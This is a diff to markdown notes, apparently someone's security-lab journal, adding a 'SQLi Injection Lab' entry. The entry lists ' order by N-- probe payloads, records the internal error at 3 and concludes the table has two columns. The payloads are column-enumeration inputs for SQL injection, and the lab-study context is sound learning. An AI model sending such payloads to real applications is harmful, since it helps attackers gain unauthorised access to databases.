@@ -30,3 +30,19 @@ ForEach ($thing in $things) {
     Write-Output "It highlights it using the GitHub style"
 }
 ```
+
+
+#### SQLi Injection Lab #?
+
+
+```SQL
+' order by 1--
+
+' order by 2--
+
+' order by 3--
+>> Internal error
+```
+Iterative Approach so 3-1 = 2.
+There are 2 columns in the table.
+
